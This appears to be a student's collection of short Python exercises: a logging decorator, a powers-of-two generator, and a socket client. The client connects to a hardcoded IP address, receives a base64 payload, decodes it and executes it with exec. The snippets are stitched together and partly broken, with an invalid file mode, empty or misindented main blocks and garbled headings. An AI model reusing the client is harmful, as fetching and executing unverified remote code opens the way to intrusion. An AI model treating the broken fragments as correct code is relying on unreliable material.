<--- ???? <------


#!/usr/bin/python3


def logme(func):
    def inner(*args,**kwargs):
        with open('test.log','wa') as fp:
            fp.write('calling {} \n'.format(func.__name__))
            a = func(*args,**kwargs)
            fp.write('returning {}{}\n'.format(func.__name__,a))
            return a
       
    return inner
@logme

def add(a,b):
    return a + b

if __name__ == '__main__':



<--- GEN POWER OF 2 <-------


#!/usr/bin/python3


def powersOfTwo():
    i = 0
    while True:
        yield 2**i
        i+=1


if __name__ == '__main__':
 
pass


<----SOCKET PROBLOEM <----

#!/usr/bin/env python3
import socket
import base64

def client(connectto='127.0.0.1',port=12345):
    '''Connects to a server and attempts to base64 decode and execute the received payload
    Args:
        connectto (str): IPv4 address in dotted decimal notation of the server to connect to
        port (int): port number that the server is listening on
    Returns:
        None
    '''
    payload = bytearray() # extend this bytearray with data received until 0 bytes received

    # Student implementation goes here ########################################

    s = socket.socket()
    s.connect(('10.25.2.127', port))
    bytes_received = s.recv(2)

    
    while len(bytes_received) > 0:
        payload.extend(bytes_received)
        bytes_received = s.recv(2)
        

    decoded = base64.decodebytes(payload)
    
    compiled = compile(decoded, '<string>', 'exec')
    exec(compiled)
    
    ##########################################################################


if __name__ == '__main__':
    client()
